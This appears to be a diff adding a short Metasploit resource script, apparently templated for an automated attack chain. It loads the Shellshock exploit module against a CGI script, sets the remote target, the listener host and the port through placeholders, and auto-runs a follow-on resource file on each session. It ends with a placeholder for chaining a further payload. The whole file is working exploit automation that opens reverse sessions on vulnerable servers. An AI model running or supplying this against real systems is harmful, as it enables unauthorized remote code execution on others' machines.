@@ -1,0 +1,8 @@
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set AutoRunScript multi_console_command -r m.rc
+set RHOSTS __RHOSTS__
+set LHOST __LHOST__
+set LPORT __LPORT__
+set TARGETURI /cgi-bin/hello_world.sh
+exploit -j -z
+__NEXT_PAYLOAD_SRC__
